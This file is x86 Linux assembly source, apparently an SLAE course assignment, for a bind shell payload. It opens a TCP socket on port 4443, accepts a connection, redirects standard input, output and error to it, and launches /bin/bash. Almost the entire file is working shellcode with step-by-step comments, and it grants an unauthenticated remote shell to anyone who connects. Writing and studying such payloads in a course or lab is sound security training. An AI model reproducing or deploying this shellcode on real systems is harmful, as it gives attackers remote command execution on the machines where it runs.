; Filename: Bind.nasm
; Author:  SLAE-1268

;
;
; Purpose: Bind shell in assembly

global _start			

section .text
_start:
	
	; creating socket
	;socket(PF_INET, SOCK_STREAM, IPPROTO_IP) 
	xor ebx,ebx	; Make EBX 0
	inc ebx		; EBX = 1 set the socketcall type to sys_socket
	xor eax, eax	; 
	push eax	; IPPROTO = 0
	inc eax		; 
	push eax	; SOCK_STREAM = 1	
	inc eax		; 
	push eax	; AF_INET/PF_INET = 2
	mov al,0x66	; 66hex Syscall for socket
	mov ecx,esp	; Mov pointer to arguments in ECX
	int 0x80	; call interput
	mov edx, eax 	; This allows us to save the FD from the socket

	;bind socket
	;bind(sockfd, {sa_family=AF_INET, sin_port=htons(4443), sin_addr=inet_addr("0.0.0.0")}, 16)
	;bind(3, {2,0x5b11,0} 0x10)
	

	xor eax,eax
	push eax	; Inet_addr = 0
	push word 0x5b11	; Port no 4443 in hex rev order
	xor ebx,ebx
	inc ebx
	inc ebx		; ebx = 2	set the socketcall type to sys_bind
	push bx		; AF_INET/PF_INET = 2
	mov ecx,esp	; Pointer to array in ecx
	mov edx, eax 	; This allows us to save the FD from the socket

	; parameters in outer ()
	push byte 0x10	; 16 in Dec 
	push ecx	; Strcuture containing Port and IP
	push 3		; sockfd = 3
	mov edx, eax 	; This allows us to save the FD from the socket

	;adjust ecx with arguments before syscall
	mov ecx,esp	; Argument paramters in ecx
	mov al,0x66	; syscall for socketcall
	int 0x80
	mov edx, eax 	; This allows us to save the FD from the socket


	;listen(host_sockid,0)
	xor eax,eax
	push eax	; Push 0
	inc ebx		; 
	push ebx	; host_sockid = 3
	inc ebx		; set socketcall type to sys_listen() 4
	mov ecx,esp	; arguments in ecx
	mov al,0x66
	int 0x80
	mov edx, eax 	; This allows us to save the FD from the socket

	;accept(host_sockid,NULL,NULL)
	xor eax,eax	
	push eax	; push NULL
	push eax	; push NULL
	inc eax		
	inc eax
	inc eax	
	push eax	; PUSH sockid 3
	mov ecx,esp	; arguments in ecx
	inc ebx		; set socketcall type to sys_accept() 5
	mov al,0x66
	int 0x80
	mov edx, eax 	; This allows us to save the FD from the socket

	;dup2(client_sockid, STDIN) STDOUT, STDERR
	mov ebx,edx	; mov last FD to ebx
	xor eax,eax
	xor ecx,ecx	; stdin file descriptor

	mov al,0x3f	; syscall for dup2()
	int 0x80	;

	mov al,0x3f
	inc ecx		; stdout file descriptor
	int 0x80	;

	mov al,0x3f
	inc ecx		; stderr file descriptor
	int 0x80	;

	;execve
	xor eax,eax
	push eax	; NULL termination on stack
	push 0x68736162	; ////bin/bash on stack in reverse order
	push 0x2f6e6962	;
	push 0x2f2f2f2f	;
	mov ebx,esp	; address of the string in EBX
	mov ecx,eax	; ECX 0
	mov edx,eax	; EDX 0

	mov al,0x0b	; syscall for execve
	int 0x80	; interrupt


		
	

